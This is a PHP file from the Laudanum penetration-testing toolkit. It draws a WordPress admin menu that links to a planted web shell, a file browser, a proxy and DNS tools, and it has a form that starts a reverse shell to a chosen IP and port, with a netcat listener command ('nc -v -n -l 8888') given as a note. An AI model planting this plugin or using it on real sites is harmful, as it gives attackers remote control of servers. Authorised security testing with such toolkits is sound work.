<?php
/* *****************************************************************************
***
*** Laudanum Project
*** A Collection of Injectable Files used during a Penetration Test
***
*** More information is available at:
***  http://laudanum.secureideas.net
***  laudanum@secureideas.net
***
***  Project Leads:
***         Kevin Johnson <kjohnson@secureideas.net>
***         Tim Medin <tim@counterhack.com>
***
*** Copyright 2014 by Kevin Johnson and the Laudanum Team
***
********************************************************************************
***
*** This file provides a convenient menu of Laudanum  tools from a Word Press settings
*** page.
***
*** Written by Jason Gillam <jgillam@secureideas.com>
***
********************************************************************************
*** This program is free software; you can redistribute it and/or
*** modify it under the terms of the GNU General Public License
*** as published by the Free Software Foundation; either version 2
*** of the License, or (at your option) any later version.
*** 
*** This program is distributed in the hope that it will be useful,
*** but WITHOUT ANY WARRANTY; without even the implied warranty of
*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*** GNU General Public License for more details.
*** 
*** You can get a copy of the GNU General Public License from this
*** address: http://www.gnu.org/copyleft/gpl.html#SEC1
*** You can also write to the Free Software Foundation, Inc., 59 Temple
*** Place - Suite 330, Boston, MA  02111-1307, USA.
***
***************************************************************************** */
?>


<div class="wrap">
	<h2>Laudanum Tools</h2>
	<ul>
	<li><a href="<?php echo plugins_url('shell.php', __FILE__);?>">Shell</a> </li>
	<li><a href="<?php echo plugins_url('dns.php', __FILE__);?>">DNS</a> </li>
	<li><a href="<?php echo plugins_url('host.php', __FILE__);?>">Host Lookup</a> </li>
	<li><a href="<?php echo plugins_url('file.php', __FILE__);?>">File Browser</a> </li>
	<li><a href="<?php echo plugins_url('proxy.php', __FILE__);?>">Proxy</a> </li>
	
	<li>Reverse Shell - 
	<form action="<?php echo plugins_url('php-reverse-shell.php', __FILE__);?>" method="post">
		IP: <input name="ip" type="text" value="127.0.0.1">
		Port: <input name="port" type="text" value="8888">
		<input type="submit" value="Connect"></p>

	</form></li>
	<!--<li><a href="<?php echo plugins_url('php-reverse-shell.php', __FILE__);?>">Reverse Shell (requires hard-coded config)</a> </li>-->
	</form>
	<li><a href="<?php echo plugins_url('killnc.php', __FILE__);?>">kill nc (recover if nc screws up your shell)</a> </li>
	
	</ul>
	* for reverse shell, use netcat to listen, e.g. "nc -v -n -l 8888"
</div>
	